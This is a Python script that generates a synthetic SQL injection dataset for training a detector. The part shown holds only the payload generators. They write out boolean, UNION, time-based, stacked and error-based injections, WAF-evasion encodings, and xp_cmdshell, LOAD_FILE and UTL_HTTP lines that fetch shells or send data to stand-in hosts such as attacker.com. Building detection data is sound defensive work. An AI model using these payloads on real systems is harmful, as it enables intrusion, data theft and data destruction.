"""
Synthetic Dataset Generator for SQL Injection Detection — v2.0

Generates ~60,000 balanced samples (30k injection + 30k safe)
with comprehensive attack types, evasion techniques, and realistic safe inputs.

NEW in v2.0:
    - 13 injection categories (was 8): added keyword-split comments, no-quote
      numeric, LIKE/REGEXP/BETWEEN bypass, hex/char encoding, nested subquery,
      HTTP parameter pollution
    - Heavy inline-comment obfuscation (UN/**/ION, SE/**/LECT, etc.)
    - Fullwidth Unicode evasion (U+FF27 → G, U+FF33 → S, etc.)
    - Scientific notation tautologies (1e0=1e0, 0x1=0x1)
    - Conditional comment MySQL bypass (/*!UNION*/ /*!SELECT*/)
    - WAF bypass: tab/newline/CR whitespace, double URL encoding
    - 30k safe samples: SQL documentation, code snippets, multi-keyword prose,
      possessives near SQL words, long paragraphs with SQL terms
    - Balanced 50/50 split to avoid training bias

Usage:
    python training/generate_dataset.py
    # Output: data/dataset.csv
"""

import csv
import random
import string
import uuid
from pathlib import Path
from typing import List, Tuple

# Seed for reproducibility
random.seed(42)

PROJECT_ROOT = Path(__file__).parent.parent
OUTPUT_DIR = PROJECT_ROOT / "data"
OUTPUT_FILE = OUTPUT_DIR / "dataset.csv"


# ═══════════════════════════════════════════════════════════════════
# HELPER FUNCTIONS
# ═══════════════════════════════════════════════════════════════════

def rand_table():
    return random.choice([
        'users', 'accounts', 'admin', 'credentials', 'passwords',
        'members', 'employees', 'customers', 'orders', 'products',
        'sessions', 'tokens', 'permissions', 'roles', 'logs',
        'payments', 'transactions', 'profiles', 'settings', 'configs',
    ])


def rand_column():
    return random.choice([
        'username', 'password', 'email', 'id', 'name', 'credit_card',
        'ssn', 'phone', 'address', 'token', 'secret', 'hash',
        'salt', 'role', 'status', 'created_at', 'ip_address',
    ])


def rand_int(lo=1, hi=100):
    return random.randint(lo, hi)


def rand_str(length=5):
    return ''.join(random.choices(string.ascii_lowercase, k=length))


def rand_comment():
    return random.choice(['--', '#', '/*', '-- -', '--+', '-- ', '#!', '/**/', '--\t'])


def rand_space():
    """Random whitespace variations including WAF bypass chars."""
    return random.choice([' ', '  ', '\t', ' \t ', '%09', '%0a', '%0d', '%0c', '+'])


def rand_case(s: str) -> str:
    """Randomize case of each character."""
    return ''.join(c.upper() if random.random() > 0.5 else c.lower() for c in s)


def url_encode_partial(s: str, fraction: float = 0.3) -> str:
    """URL-encode a random fraction of characters."""
    result = []
    for ch in s:
        if random.random() < fraction and ch.isascii() and not ch.isalnum():
            result.append(f'%{ord(ch):02X}')
        else:
            result.append(ch)
    return ''.join(result)


def double_url_encode(s: str, fraction: float = 0.3) -> str:
    """Double URL-encode a random fraction of characters."""
    result = []
    for ch in s:
        if random.random() < fraction and ch.isascii() and not ch.isalnum():
            result.append(f'%25{ord(ch):02X}')
        else:
            result.append(ch)
    return ''.join(result)


def insert_comments(s: str) -> str:
    """Insert /**/ comments between words."""
    words = s.split()
    result = []
    for i, w in enumerate(words):
        result.append(w)
        if i < len(words) - 1 and random.random() > 0.5:
            result.append('/**/')
        else:
            result.append(' ')
    return ''.join(result).strip()


def split_keyword_with_comments(keyword: str) -> str:
    """Split a keyword with inline comments: UNION -> UN/**/ION."""
    if len(keyword) < 3:
        return keyword
    pos = random.randint(1, len(keyword) - 1)
    return keyword[:pos] + '/**/' + keyword[pos:]


def to_fullwidth(s: str) -> str:
    """Convert ASCII chars to fullwidth Unicode equivalents."""
    result = []
    for ch in s:
        if 'A' <= ch <= 'Z':
            result.append(chr(ord(ch) - ord('A') + 0xFF21))
        elif 'a' <= ch <= 'z':
            result.append(chr(ord(ch) - ord('a') + 0xFF41))
        elif '0' <= ch <= '9':
            result.append(chr(ord(ch) - ord('0') + 0xFF10))
        else:
            result.append(ch)
    return ''.join(result)


def mysql_conditional_comment(s: str) -> str:
    """Wrap in MySQL conditional comment: /*!SELECT*/."""
    return f'/*!{s}*/'


# ═══════════════════════════════════════════════════════════════════
# SQL INJECTION GENERATORS
# ═══════════════════════════════════════════════════════════════════

_PREFIX_NAMES = [
    'admin', 'user', 'test', 'guest', 'root', 'john', 'jane', 'bob',
    'alice', 'mike', 'sarah', 'david', 'emma', 'alex', 'chris',
]


def rand_prefix():
    """Random realistic prefix that might precede an injection."""
    prefixes = [
        '', '', '',  # empty is common
        str(rand_int(1, 99999)), 'admin', 'user', 'test',
        rand_str(random.randint(3, 8)),
        random.choice(_PREFIX_NAMES),
        f"id={rand_int(1, 999)}&name=",
        f"{rand_int(1, 100)}",
    ]
    return random.choice(prefixes)


def gen_boolean_based(n: int) -> List[str]:
    """Generate boolean-based injection payloads."""
    samples = set()

    while len(samples) < n:
        v = rand_str(random.randint(1, 6))
        c = rand_comment()
        nn = rand_int(1, 999)
        mm = nn  # for tautology
        prefix = rand_prefix()
        space = rand_space()
        op = random.choice(['OR', 'or', 'Or', 'oR', '||'])
        and_op = random.choice(['AND', 'and', 'And', '&&'])

        templates = [
            f"{prefix}'{space}{op}{space}'{v}'='{v}",
            f"{prefix}'{space}{op}{space}'1'='1",
            f"{prefix}'{space}{and_op}{space}'1'='1",
            f"{prefix}' {op} 1=1{c}",
            f"{prefix}' {op} {nn}={nn}{c}",
            f"{prefix}' {op} '{v}'='{v}'{c}",
            f"\"{prefix}\" {op} \"1\"=\"1",
            f"{prefix}') {op} ('1'='1",
            f"{prefix}') {op} ('{v}'='{v}",
            f"{prefix}' {op} 1=1 {op} ''='",
            f"\" {op} 1=1{c}",
            f"1 {op} 1=1",
            f"{prefix}' {op} true{c}",
            f"{prefix}' {op} 1{c}",
            f"{prefix}' {op} 1=1 LIMIT {rand_int(1,10)}{c}",
            f"{prefix}' {op} 1=1 ORDER BY {rand_int(1,10)}{c}",
            f"{prefix}' {op} 1 LIKE 1{c}",
            f"{prefix}' {op} {nn} IN ({nn}){c}",
            f"{prefix}' {op} {nn} BETWEEN {nn-1} AND {nn+1}{c}",
            f"{prefix}' {op} ''='",
            f"{prefix}'%20{op}%20'1'%3D'1",
            f"{prefix}' {op} {nn}={mm} {and_op} '{v}'='{v}'{c}",
            # NEW: Scientific notation tautology
            f"{prefix}' {op} 1e0=1e0{c}",
            # NEW: Hex tautology
            f"{prefix}' {op} 0x1=0x1{c}",
            # NEW: NOT false = true
            f"{prefix}' {op} NOT 0{c}",
            f"{prefix}' {op} NOT false{c}",
            # NEW: Nested parens
            f"{prefix}' {op} ((1))=((1)){c}",
            # NEW: OR with subselect
            f"{prefix}' {op} (SELECT 1)=1{c}",
            # NEW: XOR bypass
            f"{prefix}' XOR 1=1{c}",
            f"{prefix}' XOR '1'{c}",
            # NEW: DIV/MOD bypass
            f"{prefix}' {op} 1 DIV 1{c}",
            f"{prefix}' {op} 1 MOD 1=0{c}",
        ]

        s = random.choice(templates)

        # Random variations
        if random.random() < 0.2:
            s = rand_case(s)
        if random.random() < 0.15:
            s = url_encode_partial(s)
        if random.random() < 0.05:
            s = double_url_encode(s)

        samples.add(s)

    return list(samples)[:n]


def gen_union_based(n: int) -> List[str]:
    """Generate UNION-based injection payloads."""
    samples = set()

    while len(samples) < n:
        num_cols = random.randint(1, 10)
        nulls = ','.join(['NULL'] * num_cols)
        nums = ','.join([str(i + 1) for i in range(num_cols)])
        table = rand_table()
        col1 = rand_column()
        col2 = rand_column()
        c = rand_comment()
        prefix = rand_prefix()
        union_kw = random.choice(['UNION', 'union', 'Union', 'UNION ALL', 'union all'])

        templates = [
            f"{prefix}' {union_kw} SELECT {nulls}{c}",
            f"{prefix}' {union_kw} SELECT {col1},{col2} FROM {table}{c}",
            f"{prefix}') {union_kw} SELECT {nulls}{c}",
            f"{prefix}' {union_kw} SELECT {col1},NULL FROM {table}{c}",
            f"{rand_int(-100, 0)} {union_kw} SELECT {nulls}",
            f"{prefix}' {union_kw} SELECT {nums}{c}",
            f"{prefix}' {union_kw} SELECT CONCAT({col1},0x3a,{col2}) FROM {table}{c}",
            f"{prefix}' {union_kw} SELECT GROUP_CONCAT({col1}) FROM {table}{c}",
            f"{prefix}' {union_kw} SELECT {col1} FROM information_schema.tables{c}",
            f"{prefix}' {union_kw} SELECT table_name FROM information_schema.tables WHERE table_schema=database(){c}",
            f"{prefix}' {union_kw} SELECT column_name FROM information_schema.columns WHERE table_name='{table}'{c}",
            f"{prefix}' {union_kw} SELECT {col1} FROM {table} LIMIT {rand_int(1,10)}{c}",
            f"{prefix}' {union_kw} SELECT {col1},{col2},NULL FROM {table}{c}",
            # NEW: Oracle-style dual table
            f"{prefix}' {union_kw} SELECT NULL FROM dual{c}",
            # NEW: SQLite master table
            f"{prefix}' {union_kw} SELECT sql FROM sqlite_master{c}",
            # NEW: Version extraction
            f"{prefix}' {union_kw} SELECT @@version{c}",
            f"{prefix}' {union_kw} SELECT version(){c}",
            # NEW: Multiple columns with type casting
            f"{prefix}' {union_kw} SELECT CAST({col1} AS CHAR),NULL FROM {table}{c}",
            # NEW: SELECT * from target
            f"{prefix}' {union_kw} SELECT * FROM {table}{c}",
        ]

        s = random.choice(templates)

        if random.random() < 0.2:
            s = rand_case(s)
        if random.random() < 0.15:
            s = insert_comments(s)
        if random.random() < 0.1:
            s = url_encode_partial(s)

        samples.add(s)

    return list(samples)[:n]


def gen_time_based(n: int) -> List[str]:
    """Generate time-based blind injection payloads."""
    samples = set()

    while len(samples) < n:
        delay = random.randint(1, 30)
        c = rand_comment()
        prefix = rand_prefix()
        bench_n = random.randint(100000, 99999999)

        templates = [
            f"{prefix}' AND SLEEP({delay}){c}",
            f"{prefix}' OR SLEEP({delay}){c}",
            f"{prefix}'; WAITFOR DELAY '0:0:{delay}'{c}",
            f"{prefix}' AND BENCHMARK({bench_n},SHA1('{rand_str(4)}')){c}",
            f"{prefix}' AND pg_sleep({delay}){c}",
            f"{prefix}') AND SLEEP({delay}){c}",
            f"{prefix}' AND IF(1=1,SLEEP({delay}),0){c}",
            f"{prefix}' OR IF(1=1,SLEEP({delay}),0){c}",
            f"{prefix}';SELECT SLEEP({delay}){c}",
            f"{prefix}' AND (SELECT SLEEP({delay})){c}",
            f"{prefix}' UNION SELECT SLEEP({delay}){c}",
            f"{rand_int(1, 999)};WAITFOR DELAY '0:0:{delay}'",
            f"{prefix}' AND IF(SUBSTRING(database(),{rand_int(1,10)},1)='{rand_str(1)}',SLEEP({delay}),0){c}",
            f"{prefix}' AND (SELECT {delay} FROM (SELECT(SLEEP({delay})))x){c}",
            # NEW: Oracle DBMS_PIPE
            f"{prefix}' AND DBMS_PIPE.RECEIVE_MESSAGE('a',{delay}){c}",
            # NEW: Conditional CASE with SLEEP
            f"{prefix}' AND CASE WHEN (1=1) THEN SLEEP({delay}) ELSE 0 END{c}",
            # NEW: IF with subquery
            f"{prefix}' AND IF((SELECT COUNT(*) FROM {rand_table()})>0,SLEEP({delay}),0){c}",
            # NEW: RLIKE delay
            f"{prefix}' AND 1 RLIKE (SELECT IF(1=1,SLEEP({delay}),1)){c}",
        ]

        s = random.choice(templates)
        if random.random() < 0.15:
            s = rand_case(s)
        samples.add(s)

    return list(samples)[:n]


def gen_stacked_queries(n: int) -> List[str]:
    """Generate stacked query injection payloads."""
    samples = set()

    while len(samples) < n:
        table = rand_table()
        table2 = rand_table()
        col = rand_column()
        col2 = rand_column()
        val = rand_str(random.randint(3, 10))
        c = rand_comment()
        prefix = rand_prefix()
        new_table = rand_str(random.randint(3, 8))

        templates = [
            f"{prefix}'; DROP TABLE {table}{c}",
            f"{prefix}'; DROP TABLE IF EXISTS {table}{c}",
            f"{prefix}'; DELETE FROM {table}{c}",
            f"{prefix}'; DELETE FROM {table} WHERE {col}='{val}'{c}",
            f"{prefix}'; DELETE FROM {table} WHERE 1=1{c}",
            f"{prefix}'; UPDATE {table} SET {col}='{val}'{c}",
            f"{prefix}'; UPDATE {table} SET {col}='{val}' WHERE {col2}={rand_int(1, 100)}{c}",
            f"{prefix}'; INSERT INTO {table} VALUES('{val}','{rand_str(5)}'){c}",
            f"{prefix}'; INSERT INTO {table}({col}) VALUES('{val}'){c}",
            f"{prefix}'; TRUNCATE TABLE {table}{c}",
            f"{prefix}'; ALTER TABLE {table} DROP COLUMN {col}{c}",
            f"{prefix}'; ALTER TABLE {table} ADD {rand_str(4)} VARCHAR(255){c}",
            f"{prefix}'; CREATE TABLE {new_table}(id INT, {col} VARCHAR(255)){c}",
            f"{prefix}'; SHUTDOWN{c}",
            f"{rand_int(1, 999)}; DROP TABLE {table}",
            f"{prefix}'; INSERT INTO {table}({col}) SELECT {col2} FROM {table2}{c}",
            f"{prefix}'; GRANT ALL ON {table} TO '{rand_str(5)}'{c}",
            f"{prefix}'; REVOKE ALL ON {table} FROM '{rand_str(5)}'{c}",
            f"{prefix}'; EXEC sp_executesql N'SELECT * FROM {table}'{c}",
            # NEW: PgSQL COPY
            f"{prefix}'; COPY {table} TO '/tmp/{rand_str(5)}'{c}",
            # NEW: Multi-statement chain
            f"{prefix}'; SELECT 1; DROP TABLE {table}{c}",
            # NEW: sp_configure
            f"{prefix}'; EXEC sp_configure 'show advanced options',1; RECONFIGURE{c}",
        ]

        s = random.choice(templates)
        if random.random() < 0.15:
            s = rand_case(s)
        if random.random() < 0.1:
            s = url_encode_partial(s)
        samples.add(s)

    return list(samples)[:n]


def gen_error_based(n: int) -> List[str]:
    """Generate error-based injection payloads."""
    samples = set()

    funcs = [
        'version()', 'database()', 'user()', '@@version',
        'current_user()', 'schema()', '@@hostname', '@@datadir',
        '@@basedir', '@@global.version_compile_os',
        f"(SELECT {rand_column()} FROM {rand_table()} LIMIT 1)",
    ]

    while len(samples) < n:
        c = rand_comment()
        func = random.choice(funcs)
        prefix = rand_prefix()
        hex_delim = random.choice(['0x7e', '0x3a', '0x2d', '0x7c'])

        templates = [
            f"{prefix}' AND EXTRACTVALUE(1,CONCAT({hex_delim},{func})){c}",
            f"{prefix}' AND UPDATEXML(1,CONCAT({hex_delim},{func}),1){c}",
            f"{prefix}' AND EXP(~(SELECT * FROM (SELECT {func})x)){c}",
            f"{prefix}' AND JSON_KEYS((SELECT CONVERT((SELECT {func}) USING utf8))){c}",
            f"{prefix}' AND GTID_SUBSET(CONCAT({hex_delim},{func}),1){c}",
            f"{prefix}' AND ROW(1,1)>(SELECT COUNT(*),CONCAT({func},FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x){c}",
            f"{prefix}' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT({func},FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a){c}",
            f"{rand_int(1, 999)} AND EXTRACTVALUE(1,CONCAT({hex_delim},{func})){c}",
            f"{prefix}' OR EXTRACTVALUE(1,CONCAT({hex_delim},{func})){c}",
            f"{prefix}') AND UPDATEXML(1,CONCAT({hex_delim},{func}),1){c}",
            # NEW: MSSQL error-based
            f"{prefix}' AND 1=CONVERT(int,(SELECT TOP 1 {rand_column()} FROM {rand_table()})){c}",
            # NEW: PgSQL error-based
            f"{prefix}' AND 1=CAST((SELECT {rand_column()} FROM {rand_table()} LIMIT 1) AS int){c}",
        ]

        s = random.choice(templates)
        if random.random() < 0.15:
            s = rand_case(s)
        samples.add(s)

    return list(samples)[:n]


def gen_encoded_obfuscated(n: int) -> List[str]:
    """Generate encoded and obfuscated payloads."""
    samples = []

    # Base payloads to obfuscate
    base_payloads = [
        "' OR '1'='1",
        "' UNION SELECT NULL--",
        "' AND SLEEP(5)--",
        "'; DROP TABLE users--",
        "' OR 1=1--",
        "admin'--",
        "' UNION SELECT username,password FROM users--",
    ]

    for _ in range(n):
        base = random.choice(base_payloads)
        method = random.choice([
            'url', 'double_url', 'comment', 'case', 'mixed',
            'hex_encode', 'fullwidth', 'tab_space', 'newline_space',
        ])

        if method == 'url':
            s = url_encode_partial(base, fraction=0.5)
        elif method == 'double_url':
            s = double_url_encode(base, fraction=0.4)
        elif method == 'comment':
            s = insert_comments(base)
        elif method == 'case':
            s = rand_case(base)
        elif method == 'mixed':
            s = rand_case(insert_comments(base))
            if random.random() < 0.3:
                s = url_encode_partial(s, fraction=0.2)
        elif method == 'hex_encode':
            # Hex-encode some string literals
            s = base
            for lit in ["'1'", "'a'", "users"]:
                if lit in s:
                    hex_val = '0x' + lit.strip("'").encode().hex()
                    s = s.replace(lit, hex_val, 1)
        elif method == 'fullwidth':
            # Convert some keywords to fullwidth Unicode
            s = base
            for kw in ['UNION', 'SELECT', 'OR', 'AND', 'DROP', 'SLEEP']:
                if kw in s.upper():
                    idx = s.upper().find(kw)
                    original = s[idx:idx + len(kw)]
                    s = s[:idx] + to_fullwidth(original) + s[idx + len(kw):]
                    break
        elif method == 'tab_space':
            s = base.replace(' ', random.choice(['\t', '%09', '%0a', '%0d']))
        elif method == 'newline_space':
            s = base.replace(' ', '\n')

        samples.append(s)

    return samples


def gen_comment_split_keywords(n: int) -> List[str]:
    """Generate payloads where SQL keywords are split by inline comments.

    Critical bypass technique: UN/**/ION SE/**/LECT, etc.
    These bypass naive keyword matching and WAF rules.
    """
    samples = set()

    while len(samples) < n:
        c = rand_comment()
        prefix = rand_prefix()
        num_cols = random.randint(1, 5)
        nulls = ','.join(['NULL'] * num_cols)
        table = rand_table()
        col = rand_column()

        # Split keywords with comments
        union_split = split_keyword_with_comments('UNION')
        select_split = split_keyword_with_comments('SELECT')
        drop_split = split_keyword_with_comments('DROP')
        delete_split = split_keyword_with_comments('DELETE')
        insert_split = split_keyword_with_comments('INSERT')
        update_split = split_keyword_with_comments('UPDATE')
        sleep_split = split_keyword_with_comments('SLEEP')
        concat_split = split_keyword_with_comments('CONCAT')

        templates = [
            # UNION SELECT splits
            f"{prefix}' {union_split} {select_split} {nulls}{c}",
            f"{prefix}' {union_split}/**/{select_split} {nulls}{c}",
            f"UN/**/ION/**/SE/**/LECT/**/NULL{c}",
            f"UN/**/ION SE/**/LECT {nulls}{c}",
            f"{prefix}' UNI/**/ON SEL/**/ECT {col} FROM {table}{c}",
            f"{prefix}' UN/**/ION ALL SE/**/LECT {nulls}{c}",
            # DROP TABLE splits
            f"{prefix}'; {drop_split} TABLE {table}{c}",
            f"{prefix}'; DR/**/OP TA/**/BLE {table}{c}",
            # DELETE splits
            f"{prefix}'; {delete_split} FROM {table}{c}",
            f"{prefix}'; DEL/**/ETE FR/**/OM {table}{c}",
            # INSERT splits
            f"{prefix}'; {insert_split} INTO {table} VALUES('x'){c}",
            # UPDATE splits
            f"{prefix}'; {update_split} {table} SET {col}='x'{c}",
            # SLEEP splits
            f"{prefix}' AND {sleep_split}(5){c}",
            f"{prefix}' AND SL/**/EEP(5){c}",
            # CONCAT splits
            f"{prefix}' AND {concat_split}(0x7e,version()){c}",
            # MySQL conditional comments
            f"{prefix}' /*!UNION*/ /*!SELECT*/ {nulls}{c}",
            f"{prefix}' /*!50000UNION*/ /*!50000SELECT*/ {nulls}{c}",
            f"/*!UNION*//*!SELECT*/{nulls}{c}",
            # Mixed: comment-split + case
            f"{prefix}' uN/**/iOn sE/**/LeCt {nulls}{c}",
            f"{prefix}' Un/**/IoN Se/**/LeCt {col} FROM {table}{c}",
        ]

        s = random.choice(templates)
        if random.random() < 0.2:
            s = rand_case(s)
        samples.add(s)

    return list(samples)[:n]


def gen_no_quote_numeric(n: int) -> List[str]:
    """Generate injection payloads without quotes (numeric context).

    These bypass systems that only look for quote characters.
    """
    samples = set()

    while len(samples) < n:
        c = rand_comment()
        nn = rand_int(1, 999)
        table = rand_table()
        col = rand_column()
        num_cols = random.randint(1, 5)
        nulls = ','.join(['NULL'] * num_cols)
        delay = random.randint(1, 30)

        templates = [
            # No-quote boolean
            f"1 OR 1=1{c}",
            f"{nn} OR 1=1{c}",
            f"{nn} AND 1=1{c}",
            f"1 OR {nn}={nn}{c}",
            f"-1 OR 1=1{c}",
            f"0 OR 1=1{c}",
            f"1) OR (1=1{c}",
            f"{nn}) OR ({nn}={nn}{c}",
            # No-quote UNION
            f"{nn} UNION SELECT {nulls}{c}",
            f"-1 UNION SELECT {nulls}{c}",
            f"0 UNION SELECT {col} FROM {table}{c}",
            f"1) UNION SELECT {nulls}{c}",
            # No-quote stacked
            f"{nn}; DROP TABLE {table}{c}",
            f"{nn}; DELETE FROM {table}{c}",
            f"1; SHUTDOWN{c}",
            # No-quote time-based
            f"{nn} AND SLEEP({delay}){c}",
            f"{nn} OR SLEEP({delay}){c}",
            f"{nn} AND BENCHMARK(10000000,SHA1('a')){c}",
            # No-quote error-based
            f"{nn} AND EXTRACTVALUE(1,CONCAT(0x7e,version())){c}",
            f"{nn} AND UPDATEXML(1,CONCAT(0x7e,version()),1){c}",
            # No-quote ORDER BY
            f"{nn} ORDER BY {rand_int(1, 20)}{c}",
            f"{nn} ORDER BY {rand_int(1, 20)},{rand_int(1, 20)}{c}",
        ]

        s = random.choice(templates)
        if random.random() < 0.15:
            s = rand_case(s)
        samples.add(s)

    return list(samples)[:n]


def gen_like_regexp_bypass(n: int) -> List[str]:
    """Generate LIKE/REGEXP/RLIKE/BETWEEN/IN bypass payloads.

    These replace = with alternative comparison operators.
    """
    samples = set()

    while len(samples) < n:
        c = rand_comment()
        prefix = rand_prefix()

        templates = [
            # LIKE bypass
            f"{prefix}' OR 'x' LIKE 'x'{c}",
            f"{prefix}' OR 'a' LIKE 'a'{c}",
            f"{prefix}' OR 1 LIKE 1{c}",
            f"{prefix}' OR username LIKE '%'{c}",
            f"{prefix}' OR password LIKE '%'{c}",
            f"{prefix}' OR name LIKE '%admin%'{c}",
            # REGEXP bypass
            f"{prefix}' OR 1 REGEXP 1{c}",
            f"{prefix}' OR 'a' REGEXP 'a'{c}",
            f"{prefix}' OR username REGEXP '.*'{c}",
            f"{prefix}' OR 1 REGEXP '.*'{c}",
            # RLIKE bypass (MySQL)
            f"{prefix}' OR 1 RLIKE 1{c}",
            f"{prefix}' OR 'a' RLIKE 'a'{c}",
            # BETWEEN bypass
            f"{prefix}' OR 1 BETWEEN 0 AND 2{c}",
            f"{prefix}' OR 1 BETWEEN 1 AND 1{c}",
            # IN bypass
            f"{prefix}' OR 1 IN (1){c}",
            f"{prefix}' OR 1 IN (1,2,3){c}",
            f"{prefix}' OR 'a' IN ('a','b'){c}",
            # GLOB bypass (SQLite)
            f"{prefix}' OR 1 GLOB 1{c}",
            f"{prefix}' AND GLOB('*',name){c}",
            # IS NOT NULL
            f"{prefix}' OR 1 IS NOT NULL{c}",
            f"{prefix}' OR '' IS NOT NULL{c}",
            # SOUNDS LIKE (MySQL)
            f"{prefix}' OR 'a' SOUNDS LIKE 'a'{c}",
        ]

        s = random.choice(templates)
        if random.random() < 0.2:
            s = rand_case(s)
        samples.add(s)

    return list(samples)[:n]


def gen_hex_char_encoding(n: int) -> List[str]:
    """Generate payloads using hex/char encoding to hide strings."""
    samples = set()

    while len(samples) < n:
        c = rand_comment()
        prefix = rand_prefix()
        table = rand_table()
        col = rand_column()

        templates = [
            # CHAR() encoding
            f"{prefix}' OR CHAR(49)=CHAR(49){c}",
            f"{prefix}' OR CHAR(97)='a'{c}",
            f"{prefix}' UNION SELECT CHAR(117,115,101,114,110,97,109,101){c}",
            f"{prefix}' AND CHAR(49)=CHAR(49){c}",
            # Hex encoding
            f"{prefix}' OR 0x61=0x61{c}",
            f"{prefix}' OR 0x31=0x31{c}",
            f"{prefix}' UNION SELECT 0x757365726E616D65 FROM {table}{c}",
            f"{prefix}' AND 0x41=0x41{c}",
            # CONCAT + CHAR
            f"{prefix}' OR CONCAT(CHAR(49))=CHAR(49){c}",
            f"{prefix}' UNION SELECT CONCAT(CHAR(48,120),{col}) FROM {table}{c}",
            # ASCII comparison
            f"{prefix}' AND ASCII(SUBSTRING(version(),1,1))>48{c}",
            f"{prefix}' AND ASCII(MID({col},1,1))>64{c}",
            f"{prefix}' AND ORD(MID(version(),1,1))>48{c}",
            # Binary encoding
            f"{prefix}' OR BINARY 'a'=BINARY 'a'{c}",
            # UNHEX
            f"{prefix}' OR UNHEX('31')='1'{c}",
            # Hex string in UNION
            f"{prefix}' UNION SELECT 0x{col.encode().hex()} FROM {table}{c}",
        ]

        s = random.choice(templates)
        if random.random() < 0.15:
            s = rand_case(s)
        samples.add(s)

    return list(samples)[:n]


def gen_nested_subquery(n: int) -> List[str]:
    """Generate injection payloads using nested subqueries."""
    samples = set()

    while len(samples) < n:
        c = rand_comment()
        prefix = rand_prefix()
        table = rand_table()
        col = rand_column()
        delay = random.randint(1, 15)

        templates = [
            # Nested EXISTS
            f"{prefix}' AND EXISTS(SELECT * FROM {table}){c}",
            f"{prefix}' AND EXISTS(SELECT * FROM {table} WHERE {col}='admin'){c}",
            f"{prefix}' OR EXISTS(SELECT 1 FROM {table}){c}",
            # Nested IN with subquery
            f"{prefix}' AND {col} IN (SELECT {col} FROM {table}){c}",
            f"{prefix}' OR 1 IN (SELECT 1){c}",
            # Double nested
            f"{prefix}' AND (SELECT COUNT(*) FROM (SELECT 1 UNION SELECT 2)x)>0{c}",
            f"{prefix}' AND 1=(SELECT 1 FROM {table} LIMIT 1){c}",
            # Subquery in CONCAT
            f"{prefix}' AND CONCAT((SELECT {col} FROM {table} LIMIT 1),'x')='x'{c}",
            # Nested CASE
            f"{prefix}' AND CASE WHEN (SELECT COUNT(*) FROM {table})>0 THEN 1 ELSE 0 END=1{c}",
            # Subquery time-based
            f"{prefix}' AND (SELECT SLEEP({delay}) FROM {table} LIMIT 1){c}",
            # Nested union
            f"{prefix}' AND 1=1 UNION SELECT (SELECT {col} FROM {table} LIMIT 1){c}",
            # Multi-layer
            f"{prefix}' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT {col} FROM {table} LIMIT 1),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a){c}",
        ]

        s = random.choice(templates)
        if random.random() < 0.15:
            s = rand_case(s)
        samples.add(s)

    return list(samples)[:n]


def gen_http_param_pollution(n: int) -> List[str]:
    """Generate HTTP parameter pollution style payloads.

    Simulate injection through parameter names/values in URL context.
    """
    samples = set()

    while len(samples) < n:
        c = rand_comment()
        table = rand_table()
        col = rand_column()

        templates = [
            # Parameter injection
            f"id=1' OR '1'='1{c}",
            f"user=admin'--&pass=x",
            f"q=' UNION SELECT {col} FROM {table}{c}",
            f"search=test' AND SLEEP(5){c}",
            f"name='; DROP TABLE {table}{c}",
            f"id=1&id=' OR '1'='1",
            f"page=1 UNION SELECT NULL{c}",
            f"sort=name; DROP TABLE {table}{c}",
            f"filter=' OR 1=1{c}",
            f"callback=alert(1)&id=' OR '1'='1",
            # Cookie injection style
            f"session=abc'; DROP TABLE {table}{c}",
            f"token=x' UNION SELECT {col} FROM {table}{c}",
            # Header injection style
            f"X-Forwarded-For: ' OR 1=1{c}",
            f"Referer: ' UNION SELECT {col} FROM {table}{c}",
            f"User-Agent: ' AND SLEEP(5){c}",
        ]

        s = random.choice(templates)
        if random.random() < 0.1:
            s = rand_case(s)
        samples.add(s)

    return list(samples)[:n]


def gen_os_command(n: int) -> List[str]:
    """Generate OS command injection payloads."""
    samples = set()

    cmds = [
        'dir', 'ls', 'ls -la', 'whoami', 'cat /etc/passwd', 'net user',
        'ipconfig', 'ifconfig', 'id', 'uname -a', 'type C:\\boot.ini',
        'ping attacker.com', 'nslookup attacker.com', 'curl http://attacker.com',
        'wget http://attacker.com/shell.sh', 'cat /etc/shadow', 'ps aux',
    ]
    paths = [
        '/etc/passwd', '/etc/shadow', '/etc/hosts', '/var/log/auth.log',
        '/proc/self/environ', '/root/.ssh/id_rsa', '/tmp/dump.txt',
        'C:\\Windows\\System32\\config\\SAM', 'C:\\boot.ini',
    ]
    domains = [
        'attacker.com', 'evil.com', f'{rand_str(5)}.com',
        f'{rand_str(6)}.net', f'{rand_str(4)}.xyz',
    ]

    while len(samples) < n:
        c = rand_comment()
        cmd = random.choice(cmds)
        path = random.choice(paths)
        domain = random.choice(domains)
        prefix = rand_prefix()
        col = rand_column()

        templates = [
            f"{prefix}'; EXEC xp_cmdshell('{cmd}'){c}",
            f"{prefix}'; EXEC master..xp_cmdshell '{cmd}'{c}",
            f"{prefix}' AND LOAD_FILE('{path}'){c}",
            f"{prefix}' INTO OUTFILE '{path}'{c}",
            f"{prefix}' INTO DUMPFILE '/tmp/{rand_str(5)}.bin'{c}",
            f"{prefix}'; EXEC xp_dirtree '\\\\{domain}\\share'{c}",
            f"{prefix}' UNION SELECT LOAD_FILE('{path}'){c}",
            f"{prefix}'; sp_configure 'xp_cmdshell',1; RECONFIGURE{c}",
            f"{prefix}' AND UTL_HTTP.REQUEST('http://{domain}/'||{col}){c}",
            f"{prefix}' AND UTL_INADDR.GET_HOST_ADDRESS('{domain}'){c}",
            f"{prefix}' UNION SELECT LOAD_FILE(CONCAT('/tmp/',{col})){c}",
        ]

        s = random.choice(templates)
        if random.random() < 0.1:
            s = rand_case(s)
        samples.add(s)

    return list(samples)[:n]


def gen_comment_truncation(n: int) -> List[str]:
    """Generate comment truncation payloads."""
    samples = set()

    usernames = [
        'admin', 'root', 'administrator', 'sa', 'dba', 'test', 'user',
        'sysadmin', 'operator', 'guest', 'support', 'manager', 'backup',
        rand_str(random.randint(4, 8)),
    ]

    while len(samples) < n:
        user = random.choice(usernames)
        c = rand_comment()
        extra = rand_str(random.randint(0, 5))

        templates = [
            f"{user}'{c}",
            f"{user}' {c}",
            f"{user}'/*{extra}*/",
            f"{user}' OR ''='",
            f"' {c}",
            f"') {c}",
            f"\") {c}",
            f"{user}' AND 1=1{c}",
            f"{user}' AND '{extra}'='{extra}",
            f"{user}{extra}'{c}",
            f"'{c} {extra}",
            f"{user}'/**/--",
            # NEW: Double dash with space variations
            f"{user}'-- ",
            f"{user}'--+",
            f"{user}'--\t",
            # NEW: Hash comment (MySQL)
            f"{user}'#",
            f"{user}' #",
        ]

        s = random.choice(templates)
        samples.add(s)

    return list(samples)[:n]


